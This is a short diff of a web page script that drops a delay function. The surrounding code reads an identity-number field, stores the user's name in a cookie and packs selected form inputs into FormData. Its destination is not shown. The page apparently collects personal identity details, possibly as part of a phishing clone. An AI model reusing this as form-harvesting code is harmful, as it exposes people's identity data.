@@ -91,9 +91,7 @@ margin-bottom: 0px;
     
 
    <script>
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
+ 
 
 async function checkAndSubmit() {
     const retailIdentityValue = document.getElementById('ctl00_c_RetailIdentityTextBox').value;
@@ -114,7 +112,7 @@ async function checkAndSubmit() {
 
         // İsim adında bir cookie oluştur ve değerleri kaydet
         document.cookie = `isim=${adi} ${soyadi}; path=/`;
- await sleep(500);
+ 
         // Sadece belirli input değerlerini içeren bir FormData nesnesi oluşturun
         const formData = new FormData();
         formData.append('ctl00$c$RetailIdentityTextBox', retailIdentityValue);
